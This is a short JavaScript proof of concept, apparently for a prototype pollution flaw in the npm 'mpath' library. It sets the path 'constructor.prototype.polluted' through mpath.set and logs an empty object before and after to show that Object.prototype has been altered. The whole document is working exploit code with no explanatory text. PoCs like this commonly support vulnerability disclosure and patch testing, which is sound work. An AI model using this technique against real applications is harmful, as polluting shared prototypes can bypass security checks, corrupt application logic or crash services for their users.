var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var mpath = require('mpath');
var obj = {};
console.log({}.polluted);
mpath.set('constructor.prototype.polluted', 'yes', obj);
console.log({}.polluted);